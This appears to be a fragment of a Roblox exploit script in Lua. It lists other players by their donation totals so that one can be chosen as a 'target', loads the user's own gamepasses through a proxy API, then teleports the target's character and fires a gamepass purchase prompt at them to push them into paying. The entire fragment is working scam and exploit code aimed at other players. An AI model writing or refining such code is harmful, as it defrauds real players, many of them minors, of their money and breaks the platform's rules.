-- [[ âš™ï¸ CORE SYSTEMS ]] --
local Target = nil
local Price = {id = nil, amount = 0}

local function GetTotal(p)
    local s = p:FindFirstChild("leaderstats")
    return (s and s:FindFirstChild("Donated") and s.Donated.Value or 0) + (s and s:FindFirstChild("Raised") and s.Raised.Value or 0)
end

local function Load()
    for _, p in pairs(game.Players:GetPlayers()) do
        if p ~= LP then
            local b = Instance.new("TextButton", PList); b.Size = UDim2.new(1, -10, 0, 40); b.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
            b.Text = p.DisplayName .. " [" .. GetTotal(p) .. "]"; b.TextColor3 = Color3.new(1, 1, 1); b.Font = "GothamBold"; Instance.new("UICorner", b)
            b.MouseButton1Click:Connect(function() Target = p; Display.Text = ">> TARGET LOCKED: " .. p.Name end)
        end
    end
    -- Pull your actual Gamepasses
    pcall(function()
        local games = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roproxy.com/v2/users/"..LP.UserId.."/games?accessFilter=Public&limit=5")).data
        for _, g in pairs(games) do
            local ps = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roproxy.com/v1/games/"..g.id.."/game-passes")).data
            for _, pass in pairs(ps) do
                local b = Instance.new("TextButton", RList); b.Size = UDim2.new(1, -10, 0, 40); b.BackgroundColor3 = Color3.fromRGB(0, 50, 0)
                b.Text = pass.price .. " R$"; b.TextColor3 = Color3.new(1, 1, 1); b.Font = "GothamBlack"; Instance.new("UICorner", b)
                b.MouseButton1Click:Connect(function() Price = {id = pass.id, amount = pass.price} end)
            end
        end
    end)
end

Exec.MouseButton1Click:Connect(function()
    if not Target or not Price.id then return end
    local worth = GetTotal(Target)
    if worth >= Price.amount then
        Display.Text = ">> " .. GetMsg("success", Target.Name, Price.amount)
        local root = Target.Character and Target.Character:FindFirstChild("HumanoidRootPart")
        if root then
            local old = root.CFrame
            root.CFrame = LP.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5)
            MarketplaceService:PromptGamePassPurchase(Target, Price.id)
            task.wait(5)
            root.CFrame = old
        end
    else
        Display.Text = ">> " .. GetMsg("error", Target.Name, worth)
    end
end)

